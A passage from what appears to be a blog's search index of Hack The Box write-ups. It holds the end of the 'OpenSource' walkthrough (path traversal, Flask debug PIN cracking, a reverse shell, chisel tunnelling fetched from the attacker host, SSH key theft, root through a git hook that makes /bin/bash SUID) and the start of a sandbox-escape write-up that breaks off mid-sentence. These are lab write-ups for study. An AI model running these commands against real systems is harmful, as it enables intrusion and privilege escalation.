\"1656983584.1326792-0-548799692\" \u0026lt; Date: Tue, 05 Jul 2022 01:13:04 GMT \u0026lt; Connection: close \u0026lt; * Excess found: excess = 156 url = /uploads/%2e%2e//proc/net/arp (zero-length body) * Closing connection 0  We can use a raw socket connection to see the whole response:\n$ echo 'GET /uploads/%2e%2e//proc/net/arp HTTP/1.1' | nc 10.10.11.164 80 HTTP/1.1 200 OK Server: Werkzeug/2.1.2 Python/3.10.3 Date: Tue, 05 Jul 2022 01:16:32 GMT Content-Disposition: inline; filename=arp Content-Type: application/octet-stream Content-Length: 0 Last-Modified: Tue, 05 Jul 2022 01:16:32 GMT Cache-Control: no-cache ETag: \"1656983792.5126793-0-548799692\" Date: Tue, 05 Jul 2022 01:16:32 GMT Connection: close IP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 02:42:b6:73:5f:b6 * eth0  With sed, we are able to show only the response body:\n$ echo 'GET /uploads/%2e%2e//proc/net/arp HTTP/1.1' | nc 10.10.11.164 80 | sed -n '13,$p' IP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 02:42:b6:73:5f:b6 * eth0  We can use this function called read_file to wrap the above command:\n$ function read_file() { echo \"GET /uploads/%2e%2e/$1 HTTP/1.1\" | nc 10.10.11.164 80 | sed -n '13,$p'; } $ read_file /proc/net/arp IP address HW type Flags HW address Mask Device 172.17.0.1 0x1 0x2 02:42:b6:73:5f:b6 * eth0  And there we see the eth0 interface, and also its corresponding MAC address. To format it as a decimal number, we can get rid of the colons and add 0x (because it is hexadecimal):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; 0x0242ac110006 2485377892358 \u0026gt;\u0026gt;\u0026gt; exit()  Finally, we need the machine ID, but /etc/machine-id does not exist. Therefore, we must check /proc/sys/kernel/random/boot_id, according to the exploit:\n$ read_file /proc/sys/kernel/random/boot_id 0abba663-d46d-4efb-8e26-158c2e4cb6c2  Now we can set the parameters in the Python exploit and get the PIN for the console:\n$ python3 pin_exploit.py 101-705-652  If the PIN does not work, we must add a value from /proc/self/cgroups:\n$ read_file /proc/self/cgroup 12:freezer:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 11:rdma:/ 10:hugetlb:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 9:pids:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 8:memory:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 7:cpuset:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 6:net_cls,net_prio:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 5:devices:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 4:blkio:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 3:cpu,cpuacct:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 2:perf_event:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 1:name=systemd:/docker/1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb 0::/system.slice/snap.docker.dockerd.service  Specifically, we must append\n1445deaaf7a2080ee9da178199caa1f9d1821098ce9e72eb51349bf6f1b754bb\nto the machine ID (0abba663-d46d-4efb-8e26-158c2e4cb6c2), and run the exploit again:\n$ python3 pin_exploit.py 115-017-757  If it still does not work, we can change from MD5 hash to SHA1 or vice versa.\nFinally, we will get a valid PIN and enter the console.\nThe first thing to notice is that the container does not have Bash, but nc, so we must use a specific reverse shell payload to access the system. This is the command (taken from pentestmonkey.net):\nAnd we get the connection back:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.164. Ncat: Connection from 10.10.11.164:42081. /bin/sh: can't access tty; job control turned off /app # python3 -c 'import pty; pty.spawn(\"/bin/sh\")' /app # ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm /app # export TERM=xterm /app # stty rows 50 columns 158  Container enumeration We can confirm that we are in a Docker container (there is a file called .dockerenv and the IP address is 172.17.0.6):\n/app # ls -la / total 68 drwxr-xr-x 1 root root 4096 Jul 4 01:27 . drwxr-xr-x 1 root root 4096 Jul 4 01:27 .. -rwxr-xr-x 1 root root 0 Jul 4 01:27 .dockerenv drwxr-xr-x 1 root root 4096 May 4 16:35 app drwxr-xr-x 1 root root 4096 Mar 17 05:52 bin drwxr-xr-x 5 root root 340 Jul 4 01:27 dev drwxr-xr-x 1 root root 4096 Jul 4 01:27 etc drwxr-xr-x 2 root root 4096 May 4 16:35 home drwxr-xr-x 1 root root 4096 May 4 16:35 lib drwxr-xr-x 5 root root 4096 May 4 16:35 media drwxr-xr-x 2 root root 4096 May 4 16:35 mnt drwxr-xr-x 2 root root 4096 May 4 16:35 opt dr-xr-xr-x 230 root root 0 Jul 4 01:27 proc drwx------ 1 root root 4096 Jul 4 01:53 root drwxr-xr-x 1 root root 4096 Jul 4 01:27 run drwxr-xr-x 1 root root 4096 Mar 17 05:52 sbin drwxr-xr-x 2 root root 4096 May 4 16:35 srv dr-xr-xr-x 13 root root 0 Jul 4 01:27 sys drwxrwxrwt 1 root root 4096 Jul 4 01:52 tmp drwxr-xr-x 1 root root 4096 May 4 16:35 usr drwxr-xr-x 1 root root 4096 May 4 16:35 var /app # ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 12: eth0@if13: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\u0026gt; mtu 1500 qdisc noqueue state UP link/ether 02:42:ac:11:00:06 brd ff:ff:ff:ff:ff:ff inet 172.17.0.6/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever  Here, we must recall that port 3000 was filtered on the machine, maybe we are able to access this port from the container, using network 172.17.0.0/16:\n/app # wget -qO- 172.17.0.1:3000 | head \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\"en-US\" class=\"theme-\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\"utf-8\"\u0026gt; \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; \u0026lt;title\u0026gt; Gitea: Git with a cup of tea\u0026lt;/title\u0026gt; \u0026lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19\"/\u0026gt; \u0026lt;meta name=\"theme-color\" content=\"#6cc644\"\u0026gt; \u0026lt;meta name=\"default-theme\" content=\"auto\" /\u0026gt; \u0026lt;meta name=\"author\" content=\"Gitea - Git with a cup of tea\" /\u0026gt;  Port forwarding There it is. To access this page from a browser, we must use chisel to do port forwarding.\n$ python3 -m http.server Serving HTTP on :: port 8000 (http://[::]:8000/) ... ::ffff:10.10.11.164 - - [] \"GET /chisel HTTP/1.1\" 200 -  /app # cd /tmp /tmp # wget 10.10.17.44:8000/chisel -qO .chisel /tmp # chmod +x .chisel  $ ./chisel server -p 1234 --reverse server: Reverse tunnelling enabled server: Fingerprint FX/QSjEzTqjMotC2jW9Y5lk6gKLr5IlopGmfEndFGhU= server: Listening on http://0.0.0.0:1234 server: session#1: tun: proxy#R:3000=\u0026gt;172.17.0.1:3000: Listening  /tmp # ./.chisel client 10.10.17.44:1234 R:3000:172.17.0.1:3000 client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 81.99391ms)  Access to Gitea Now we can go to http://127.0.0.1:3000 and we see a Gitea web application:\nThis is an open-source Git repository manager (like GitHub). We can list the registered users:\nThere\u0026rsquo;s one called dev01\u0026hellip; Let\u0026rsquo;s try to login using the credentials found earlier:\nAnd we are in:\nThere is a repository called home-backup, and it contains files that should be the user\u0026rsquo;s home directory:\nLet\u0026rsquo;s go to .ssh and grab the id_rsa private SSH key:\nOne way to get the files is use git, via the tunnel:\n$ git clone http://127.0.0.1:3000/dev01/home-backup.git Clonando en 'home-backup'... Username for 'http://127.0.0.1:3000': dev01 Password for 'http://dev01@127.0.0.1:3000': remote: Counting objects: 11, done. remote: Compressing objects: 100% (8/8), done. remote: Total 11 (delta 0), reused 0 (delta 0) Desempaquetando objetos: 100% (11/11), 5.77 KiB | 1.44 MiB/s, listo.  Now, let\u0026rsquo;s access through SSH using the private key:\n$ chmod 600 home-backup/.ssh/id_rsa $ ssh -i home-backup/.ssh/id_rsa dev01@10.10.11.164 dev01@opensource:~$ cat user.txt d2d88b24d324fb497c67d10a9c691310  System enumeration Basic enumeration does not show anything useful:\ndev01@opensource:~$ id uid=1000(dev01) gid=1000(dev01) groups=1000(dev01) dev01@opensource:~$ sudo -l [sudo] password for dev01: Sorry, user dev01 may not run sudo on opensource. dev01@opensource:~$ find / -perm -4000 2\u0026gt;/dev/null | grep -v snap /bin/fusermount /bin/umount /bin/mount /bin/su /bin/ping /usr/lib/eject/dmcrypt-get-device /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/traceroute6.iputils /usr/bin/newgrp /usr/bin/newuidmap /usr/bin/chsh /usr/bin/at /usr/bin/gpasswd /usr/bin/newgidmap /usr/bin/sudo /usr/bin/chfn  If we use pspy to enumerate running processes, we can see some Git commands that are interesting:\ndev01@opensource:~$ cd /tmp dev01@opensource:/tmp$ wget 10.10.17.44:8000/pspy64s -qO .pspy dev01@opensource:/tmp$ chmod +x .pspy dev01@opensource:/tmp$ ./.pspy  ... CMD: UID=0 PID=2689 | /usr/sbin/CRON -f CMD: UID=0 PID=2697 | /bin/bash /root/meta/app/clean.sh CMD: UID=0 PID=2696 | cp /root/config /home/dev01/.git/config CMD: UID=0 PID=2698 | /bin/bash /usr/local/bin/git-sync CMD: UID=0 PID=2702 | git commit -m Backup for 2022-07-05 CMD: UID=0 PID=2706 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git CMD: UID=0 PID=2705 | cut -d -f1 CMD: UID=0 PID=2704 | /snap/bin/docker exec upcloud6000 hostname -i CMD: UID=0 PID=2703 | git push origin main ...  Basically, it is committing some changes in a repository every minute.\nPrivilege escalation The idea here is that we can use Git hooks to execute scripts, either before commit of after commit. We can see some useful commands in GTFOBins, or the same information using my tool gtfobins-cli:\n$ gtfobins-cli --shell git git ==\u0026gt; https://gtfobins.github.io/gtfobins/git/ Shell It can be used to break out from restricted environments by spawning an interactive system shell. PAGER='sh -c \"exec sh 0\u0026lt;\u00261\"' git -p help This invokes the default pager, which is likely to be less, other functions may apply. git help config !/bin/sh The help system can also be reached from any git command, e.g., git branch. This invokes the default pager, which is likely to be less, other functions may apply. git branch --help config !/bin/sh Git hooks are merely shell scripts and in the following example the hook associated to the pre-commit action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the -C option. TF=$(mktemp -d) git init \"$TF\" echo 'exec /bin/sh 0\u0026lt;\u00262 1\u0026gt;\u00262' \u0026gt;\"$TF/.git/hooks/pre-commit.sample\" mv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\" git -C \"$TF\" commit --allow-empty -m x TF=$(mktemp -d) ln -s /bin/sh \"$TF/git-x\" git \"--exec-path=$TF\" x  Alright, so we must enter a command in a file called pre-commit (without .sample suffix) inside .git/hooks. For instance, let\u0026rsquo;s add SUID permissions to /bin/bash:\ndev01@opensource:/tmp$ echo 'chmod 4755 /bin/bash' \u0026gt; ~/.git/hooks/pre-commit dev01@opensource:/tmp$ chmod +x ~/.git/hooks/pre-commit dev01@opensource:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash  After some seconds, the script is executed by root when doing git commit and /bin/bash becomes a SUID binary:\ndev01@opensource:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash  So, we can run Bash as root and get the root.txt flag:\ndev01@opensource:/tmp$ bash -p bash-4.4# cat /root/root.txt a470e19e4c146962df93f39de9df63e7  ","image":"/images/HTB/OpenSource/OpenSource.png","permalink":"https://7rocky.github.io/en/htb/opensource/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a website exposes its source code, being vulnerable to Directory Path Traversal. Using this vulnerability we can read the necessary files to compute the PIN for the Flask debug console and get Remote Code Execution in a Docker container. After that, we need to use port forwarding to view a Gitea instance and enter credentials found in a Git repository. Here we have the private SSH key so we can enter as a system user. There is a Cron job that commits new changes of a Git repository and leads to privilege escalation","time":15,"title":"OpenSource"},{"contents":"  OS: Linux   Difficulty: Insane   IP Address: 10.10.11.141   Release: 29 / 01 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.141 -p 22,80 Nmap scan report for 10.10.11.141 Host is up (0.061s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA) | 256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA) |_ 256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Malware Scanner |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.60 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.141, we will see a page like this:\nIt tells that they have developed a secure sandbox using chroot, user namespaces and ptrace. We have another page to upload a malware binary:\nJust for testing, we can compile a simple C program like this one:\n#include \u0026lt;stdio.h\u0026gt; int main() { printf(\"Hello, World!\\n\"); return 0; }  $ gcc hello.c -o hello  And upload it. We will see this report on the system calls used by the binary:\nWe might need to analyze the source code for the sandbox and for the web application.\nAnalyzing sandbox code This is the main function of the program:\nint main(int argc, char** argv) { if (argc \u0026lt; 2) { printf(\"Usage: %s \u0026lt;program\u0026gt; [uuid]\\n\", argv[0]); exit(-2); } if (strlen(argv[1]) \u0026gt; FILENAME_MAX - 50) { DIE(\"Program name too long\"); } if ((argv[1][0]) != '/') { DIE(\"Program path must be absolute\"); } umask(0); check_caps(); int result = mkdir(\"jails\", 0771); if (result == -1 \u0026amp;\u0026amp; errno != EEXIST) { DIE( \"Could not create jail directory\"); } char uuid[33] = {0}; if (argc \u0026lt; 3) { generate_uuid(uuid); } else { memcpy(uuid, argv[2], 32); } uuid[32] = 0; make_jail(uuid, argv[1]); }  The first check is that the sandbox binary has enough capabilities:\nvoid check_caps() { struct user_cap_header_struct header; struct user_cap_data_struct caps; char pad[32]; header.version = _LINUX_CAPABILITY_VERSION_3; header.pid = 0; caps.effective = caps.inheritable = caps.permitted = 0; syscall(SYS_capget, \u0026amp;header, \u0026amp;caps); if (!(caps.effective \u0026amp; 0x2401c0)) { DIE(\"Insufficient capabilities\"); } }  We can use capsh to decode the hexadecimal representation of 0x2401c0 to capability names:\n$ capsh --decode=0x2401c0 0x00000000002401c0=cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin  So the binary has those capabilities, which are really interesting.\nThen it does some configurations on the file system and finally calls make_jail:\nvoid make_jail(char* name, char* program) { jailsfd = open(\"jails\", O_RDONLY|__O_DIRECTORY); if (faccessat(jailsfd, name, F_OK, 0) == 0) { DIE(\"Jail name exists\"); } int result = mkdirat(jailsfd, name, 0771); if (result == -1 \u0026amp;\u0026amp; errno != EEXIST) { DIE( \"Could not create the jail\"); } if (access(program, F_OK) != 0) { DIE(\"Program does not exist\"); } chdir(\"jails\"); chdir(name); copy_libs(); do_namespaces(); copy(program, \"./userprog\"); if (chroot(\".\")) {DIE(\"Couldn't chroot #1\");} if (setgid(1001)) {DIE(\"SGID\");} if (setegid(1001)) {DIE(\"SEGID\");} if (setuid(1001)) {DIE(\"SUID\");}; if (seteuid(1001)) {DIE(\"SEUID\");}; do_trace(); sleep(3); }  Another useful function is copy_libs:\nvoid copy_libs() { char* libs[] = {\"libc.so.6\", NULL}; char path[FILENAME_MAX] = {0}; char outpath[FILENAME_MAX] = {0}; system(\"mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin\"); for (int i = 0; libs[i] != NULL; i++) { sprintf(path, \"/lib/x86_64-linux-gnu/%s\", libs[i]); // sprintf(path, \"/lib/%s\", libs[i]); sprintf(outpath, \"./usr/lib/%s\", libs[i]); copy(path, outpath); } copy(\"/lib64/ld-linux-x86-64.so.2\", \"./usr/lib64/ld-linux-x86-64.so.2\"); system(\"ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin\"); }  Which shows that inside the jail we will have Glibc and /bin/sh.\nAnd there is another interesting function called do_namespaces:\nvoid do_namespaces() { if (unshare(CLONE_NEWPID|CLONE_NEWNET) != 0) {DIE(\"Couldn't make namespaces\");}; // Create pid-1 if (fork() != 0) {sleep(6); exit(-1);} mkdir(\"./proc\", 0555); mount(\"/proc\", \"./proc\", \"proc\", 0, NULL); }  This one does something that can be abused. It is mounting the /proc directory of a child process of sandbox into the jail. This fact is useful for exploitation because we can read information about the sandbox process.\nFinally, the function make_jail creates the chroot environment and changes to that directory, sets the user and group permissions to UID/GID 1001 and finally calls do_trace to trace the malware behavior:\nvoid do_trace() { // We started with capabilities - we must reset the dumpable flag // so that the child can be traced prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0); // Remove dangerous capabilities before the child starts struct user_cap_header_struct header; struct user_cap_data_struct caps; char pad[32]; header.version = _LINUX_CAPABILITY_VERSION_3; header.pid = 0; caps.effective = caps.inheritable = caps.permitted = 0; syscall(SYS_capget, \u0026amp;header, \u0026amp;caps); caps.effective = 0; caps.permitted = 0; syscall(SYS_capset, \u0026amp;header, \u0026amp;caps); int child = fork(); if (child == -1) { DIE(\"Couldn't fork\"); } if (child == 0) { do_child(); } int killer = fork(); if (killer == -1) { DIE(\"Couldn't fork (2)\"); } if (killer == 0) { do_killer(child); } else { do_log(child); } }  This function is a bit large, but it is not complex. It does a first fork and calls do_child which basically enables the malware binary to be dumpable by ptrace and runs it with execve:\nvoid do_child() { // Prevent child process from escaping chroot close(jailsfd); prctl(PR_SET_PDEATHSIG, SIGHUP); ptrace(PTRACE_TRACEME, 0, NULL, NULL); char* args[] = {NULL}; execve(\"/userprog\", args, NULL); DIE(\"Couldn't execute user program\"); }  Then, it forks again and kills the malware execution after 5 seconds with do_killer:\nvoid do_killer(int pid) { sleep(5); if (kill(pid, SIGKILL) == -1) {DIE(\"Kill err\");} puts(\"Killed subprocess\"); exit(0); }  And at the same time, the function calls do_log, which is a function that uses ptrace to extract all the syscall instructions used by the malware binary (actually in another function called log_syscall):\nvoid log_syscall(struct user_regs_struct regs, unsigned long ret) { registers result; result.rax = regs.orig_rax; result.rdi = regs.rdi; result.rsi = regs.rsi; result.rdx = regs.rdx; result.r10 = regs.r10; result.r8 = regs.r8; result.r9 = regs.r9; result.ret = ret; int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777); if (fd == -1) { return; } write(fd, \u0026amp;result, sizeof(registers)); close(fd); }  All the syscall instructions will be added to a log file that is inside the chroot environment. And this log file is analyzed by the web server and printed out as a report.\nAnalyzing web application We are also given the web application source code, which is a Django application (written in Python). Django projects have a lot of files, but most of them are default ones.\nThis is the function that executes the malware binary inside the sandbox (scanner/views.py):\ndef handle_file(file): md5 = calculate_file_md5(file) path = f\"{settings.FILE_PATH}/{md5}\" with open(path, 'wb+') as f: for chunk in file.chunks(): f.write(chunk) os.system(f\"cd {settings.SBX_PATH}; ./sandbox {path} {md5}\") os.remove(path) return md5  We might think of command injection because of string interpolation, but none of the variables seem to be external, so we can\u0026rsquo;t control them.\nInside viewer/views.py we see two functions:\ndef view_file(request, md5: str): path = f\"{settings.SBX_PATH}/jails/{md5}\" if not os.path.exists(path): raise Http404(\"A sample with this hash has not been uploaded.\") logfile = f\"{path}/log\" if not os.path.exists(logfile): return HttpResponse(\"There was an error logging this application\") syscalls = [call.render() for call in parse_log(logfile)] ignore = list(filter(lambda call: call[0] == SyscallClass.Ignore, syscalls)) low = list(filter(lambda call: call[0] == SyscallClass.Low, syscalls)) med = list(filter(lambda call: call[0] == SyscallClass.Medium, syscalls)) high = list(filter(lambda call: call[0] == SyscallClass.High, syscalls)) render_vars = {\"md5\": md5, \"ignore\": ignore, \"low\": low, \"med\": med, \"high\": high} return render(request, 'view.html', render_vars) def parse_log(path): syscalls = [] with open(path, 'rb') as f: chunk = f.read(8 * 8) nums = struct.unpack(\"q\" * 8, chunk) while len(chunk) == 8*8: nums = struct.unpack(\"q\" * 8, chunk) call = LoggedSyscall(nums) syscalls.append(call) chunk = f.read(8 * 8) return syscalls  These functions are used to parse the log file generated by the sandbox binary, and render them in the report.\nWe can see another file viewer/syscalls.py where the syscall instructions found in the log file are parsed and classified depending on the registers setup ($rax, $rdi, $rsi\u0026hellip;):\nimport numbers import enum from typing import List, Tuple class SyscallClass(enum.Enum): Ignore = 0 Low = 1 Medium = 2 High = 3 def __gt__(self, other): if isinstance(other, numbers.Real): return self.value \u0026gt; other return self.value \u0026gt; other.value def __lt__(self, other): if isinstance(other, numbers.Real): return self.value \u0026lt; other return self.value \u0026lt; other.value # Class, name, syscall number, arg count syscalls = [ [SyscallClass.Low, \"read\", 0, 3], [SyscallClass.Low, \"write\", 1, 3], [SyscallClass.Medium, \"open\", 2, 3], [SyscallClass.Low, \"close\", 3, 1], [SyscallClass.Medium, \"stat\", 4, 2], [SyscallClass.Medium, \"fstat\", 5, 2], [SyscallClass.Medium, \"lstat\", 6, 2], [SyscallClass.Medium, \"access\", 21, 2], [SyscallClass.Low, \"alarm\", 37, 1], [SyscallClass.High, \"socket\", 41, 3], [SyscallClass.High, \"connect\", 42, 3], [SyscallClass.High, \"accept\", 43, 3], [SyscallClass.High, \"shutdown\", 48, 2], [SyscallClass.High, \"bind\", 49, 3], [SyscallClass.High, \"listen\", 50, 2], [SyscallClass.Medium, \"clone\", 56, 5], [SyscallClass.Medium, \"fork\", 57, 0], [SyscallClass.Medium, \"vfork\", 58, 0], [SyscallClass.High, \"execve\", 59, 3], [SyscallClass.High, \"kill\", 62, 2], [SyscallClass.Medium, \"uname\", 63, 1], [SyscallClass.Medium, \"getdents\", 78, 3], [SyscallClass.Medium, \"getcwd\", 79, 2], [SyscallClass.Medium, \"chdir\", 80, 1], [SyscallClass.Medium, \"fchdir\", 81, 1], [SyscallClass.High, \"rename\", 82, 2], [SyscallClass.Low, \"mkdir\", 83, 2], [SyscallClass.High, \"rmdir\", 84, 1], [SyscallClass.High, \"unlink\", 87, 1], [SyscallClass.Medium, \"chmod\", 90, 2], [SyscallClass.Medium, \"fchmod\", 91, 2], [SyscallClass.High, \"chown\", 92, 3], [SyscallClass.High, \"fchown\", 93, 3], [SyscallClass.High, \"ptrace\", 101, 4], ] template = \"\"\"\u0026lt;div class=\"alert alert-{}\" style=\"width: 80%\" role=\"alert\"\u0026gt; \u0026lt;p style=\"font-family: Courier New,Courier,Lucida Sans Typewriter,Lucida Typewriter,monospace;\"\u0026gt;{}({}) = {}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \"\"\" class LoggedSyscall: sys_num: int rdi: int rsi: int rdx: int r10: int r8: int r9: int ret: int def __init__(self, values): self.sys_num, self.rdi, self.rsi, self.rdx, \\ self.r10, self.r8, self.r9, self.ret = values def get_args(self, count) -\u0026gt; List[int]: if count == 0: return [] if count == 1: return [self.rdi] if count == 2: return [self.rdi, self.rsi] if count == 3: return [self.rdi, self.rsi, self.rdx] if count == 4: return [self.rdi, self.rsi, self.rdx, self.r10] if count == 5: return [self.rdi, self.rsi, self.rdx, self.r10, self.r8] if count == 6: return [self.rdi, self.rsi, self.rdx, self.r10, self.r8, self.r9] def render(self) -\u0026gt; Tuple[SyscallClass, str]: status = \"light\" for sys_entry in syscalls: if sys_entry[2] == self.sys_num: if sys_entry[0] == SyscallClass.Low: status = \"success\" elif sys_entry[0] == SyscallClass.Medium: status = \"warning\" elif sys_entry[0] == SyscallClass.High: status = \"danger\" rendered = template.format(status, f\"{sys_entry[1]}\", \", \".join([ hex(x) for x in self.get_args(sys_entry[3]) ]), hex(self.ret)) return sys_entry[0], rendered rendered = template.format(status, f\"sys_{self.sys_num}\", \"\", hex(self.ret)) return SyscallClass.Ignore, rendered  Abusing misconfigurations First of all, we might want to escape from chroot jail by using the traditional technique of creating another chroot environment and climbing up to the real root directory and calling chroot again. However, this doesn\u0026rsquo;t work because the chroot environment is correctly setup.\nIn order to do some tests locally, I copied the sources in this machine and started the same project they have:\n$ python3 manage.py migrate Operations to perform: Apply all migrations: admin, auth, contenttypes, sessions Running migrations: Applying contenttypes.0001_initial... OK Applying auth.0001_initial... OK Applying admin.0001_initial... OK Applying admin.0002_logentry_remove_auto_add... OK Applying admin.0003_logentry_add_action_flag_choices... OK Applying contenttypes.0002_remove_content_type_name... OK Applying auth.0002_alter_permission_name_max_length... OK Applying auth.0003_alter_user_email_max_length... OK Applying auth.0004_alter_user_username_opts... OK Applying auth.0005_alter_user_last_login_null... OK Applying auth.0006_require_contenttypes_0002... OK Applying auth.0007_alter_validators_add_error_messages... OK Applying auth.0008_alter_user_username_max_length... OK Applying auth.0009_alter_user_last_name_max_length... OK Applying auth.0010_alter_group_name_max_length... OK Applying auth.0011_update_proxy_permissions... OK Applying auth.0012_alter_user_first_name_max_length... OK Applying sessions.0001_initial... OK $ python3 manage.py runserver Watching for file changes with StatReloader Performing system checks... System check identified no issues (0 silenced). Django version 3.2.6, using settings 'malscanner.settings' Starting development server at http://127.0.0.1:8000/ Quit the server with CONTROL-C.  Since traditional chroot escapes don\u0026rsquo;t work, we need to keep things simple. For example, we can try to list directories from the malware binary perspective using this C script:\n#include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { DIR* dr; struct dirent *de; dr = opendir(\".\"); if (dr == NULL) { printf(\"Could not open current directory\"); return 1; } while ((de = readdir(dr)) != NULL) { printf(\"%s\\n\", de-\u0026gt;d_name); } closedir(dr); return 0; }  We compile it and upload it and we see the output in the server log:\n[] \"GET /scanner/upload HTTP/1.1\" 301 0 [] \"GET /scanner/upload/ HTTP/1.1\" 200 2189 usr . lib userprog bin proc .. lib64 log Exited [] \"POST /scanner/upload/ HTTP/1.1\" 302 0 [] \"GET /viewer/ce6407480db61da2177849329f4aeb83 HTTP/1.1\" 301 0 [] \"GET /viewer/ce6407480db61da2177849329f4aeb83/ HTTP/1.1\" 200 18239  Alright, so we have those directories and files. We can continue enumerating the file system locally from the server log, but eventually, we need to find a way to have an output.\nIn fact, there is a very cool way using the log file. We can insert the information we want to exfiltrate as if it were a syscall instruction inside the log, so that the web server prints it out in the report. Then, we can extract the information.\nWe can make use of the same functions that are in tracing.c from the source code we have and write them in the log:\n#include \u0026lt;dirent.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; typedef struct __attribute__((__packed__)) { unsigned long rax; unsigned long rdi; unsigned long rsi; unsigned long rdx; unsigned long r10; unsigned long r8; unsigned long r9; unsigned long ret; } registers; void log_syscall(registers regs, unsigned long ret) { registers result; result.rax = regs.rax; result.rdi = regs.rdi; result.rsi = regs.rsi; result.rdx = regs.rdx; result.r10 = regs.r10; result.r8 = regs.r8; result.r9 = regs.r9; result.ret = ret; int fd = open(\"/log\", O_CREAT|O_RDWR|O_APPEND, 0777); if (fd == -1) { return; } write(fd, \u0026amp;result, sizeof(registers)); close(fd); } int main() { DIR* dr; struct dirent *de; registers regs; unsigned long ret; regs.rax = 0x3b; regs.rdi = 0x41414141; regs.rsi = 0x42424242; regs.rdx = 0x43434343; regs.r10 = 0x44444444; regs.r8 = 0x45454545; regs.r9 = 0x46464646; ret = 0x47474747; dr = opendir(\".\"); if (dr == NULL) { printf(\"Could not open current directory\"); return 1; } while ((de = readdir(dr)) != NULL) { printf(\"%s\\n\", de-\u0026gt;d_name); } log_syscall(regs, ret); closedir(dr); return 0; }  The above script will register a sys_execve ($rax = 0x3b) using some recognizable numbers as register values. If we upload it and watch the 